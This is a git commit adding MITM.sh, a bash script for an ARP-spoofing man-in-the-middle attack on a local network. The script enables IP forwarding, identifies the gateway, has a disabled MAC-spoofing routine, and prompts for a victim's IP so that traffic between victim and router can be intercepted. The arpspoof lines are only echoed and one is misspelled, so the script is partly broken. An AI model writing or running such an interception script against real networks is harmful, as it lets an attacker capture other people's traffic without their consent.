0c83f3429c04078556aebc55dfc0ca6ca0f4ae11
BuildAndDestroy <devreap1@gmail.com>
2016-12-31 16:30:46 -0700

    Push files to github

---
+++ MITM.sh
@@ -0,0 +1,52 @@
+#!/bin/bash
+
+function routeme_f() {
+    echo 'Configuring machine to allow port forwarding...'
+    if [ $(cat /proc/sys/net/ipv4/ip_forward) != 1 ]; then
+        echo '1' > /proc/sys/net/ipv4/ip_forward
+    fi
+}
+
+function gateway_device_f() {
+    gateway_r=$(route -n | grep 'UG' | awk '{print $NF}')
+}
+
+function macspoof_f() {
+    echo 'Spoofing mac address'
+    ifconfig $gateway_r down
+    macchanger -r $gateway_r
+    ifconfig $gateway_r up
+    echo $(tput setaf 2)Complete!$(tput sgr0)
+}
+
+function gateway_f() {
+    gateway_r_ip=$(route -n | grep 'UG' | awk '{print $2}')
+    #echo $gateway_r_ip
+}
+
+function arpspoof_f() {
+    echo "I need the victim's IP address:"
+    read -r -p '>>> ' victimIP
+    echo ''
+
+    echo Configuring arpspoof between victim and router...
+    echo arpsoof -i $gateway_r -t $victimIP $gateway_r_ip
+    echo $(tput setaf 2)Complete!$(tput sgr0)
+    echo ''
+
+    echo Configuring arpspoof to capture packets from router to victim...
+    echo arpspoof -i $gateway_r -t $gateway_r_ip $victimIP
+    echo $(tput setaf 2)Complete!$(tput sgr0)
+    echo ''
+}
+
+routeme_f
+gateway_device_f
+#macspoof_f
+gateway_f
+arpspoof_f
+
+sleep 4
+screen -c my_screenrc
+
+
